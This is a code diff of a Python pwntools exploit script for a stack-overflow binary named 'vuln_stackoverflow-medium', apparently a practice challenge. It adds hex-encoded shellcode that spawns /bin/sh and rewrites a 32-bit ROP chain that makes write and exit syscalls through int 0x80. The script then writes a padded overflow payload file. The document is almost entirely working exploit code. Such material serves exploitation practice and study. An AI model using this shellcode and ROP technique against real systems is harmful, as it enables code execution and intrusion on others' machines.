@@ -30,6 +30,7 @@ def find_symbolic_buffer(state, length):
     for addr in sym_addrs:
         if check_continuity(addr, sym_addrs, length):
             yield addr
+shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
 exe = context.binary = ELF('vuln_stackoverflow-medium')
 libc = exe.libc
 base_libc = exe.maps[libc.path]
@@ -182,20 +183,37 @@ def main():
     push_and_call_args = 0x00076ab0
 
 
-    chain += p32(code_base + pop_ecx_eax)
-    chain += p32(code_base + 0x000ee010)
-    chain += p32(0xffffffff)
+    mov_ebx_edx = 0x000ed9a2
+    mov_eax_4 = 0x000b36b0
+    mov_eax_1 = 0x00031ad8
+    int80 = 0x1002b2#0xc6c36
+
+
     chain += p32(code_base + xor_eax_eax)
     chain += p32(code_base + add_eax_3)
     chain += p32(code_base + mov_edx_eax)
-    chain += p32(code_base + mov_esi_edx)
-    chain += p32(code_base + pop_edx)
+    chain += p32(code_base + mov_ebx_edx)
+    chain += p32(code_base + pop_ecx_eax)
     chain += p32(0x804c055)
+    chain += p32(0xffffffff)
     chain += p32(code_base + xor_eax_eax)
     chain += p32(code_base + add_eax_7)
-    chain += p32(code_base + push_and_call_args)
-    #######custom rop call write##########
+    chain += p32(code_base + mov_edx_eax)
+    chain += p32(code_base + mov_eax_4)
+    chain += p32(code_base + int80)
+    
 
+
+
+    #######custom rop call write##########
+    chain +=p32(0xffffffff)*3
+
+    #exit
+    chain += p32(code_base + xor_eax_eax)
+    chain += p32(code_base + mov_edx_eax)
+    chain += p32(code_base + mov_ebx_edx)
+    chain += p32(code_base + mov_eax_1)
+    chain += p32(code_base + int80)
 
     with open("payload","wb") as f:
         f.write(pointer_offset*b"a"+chain)
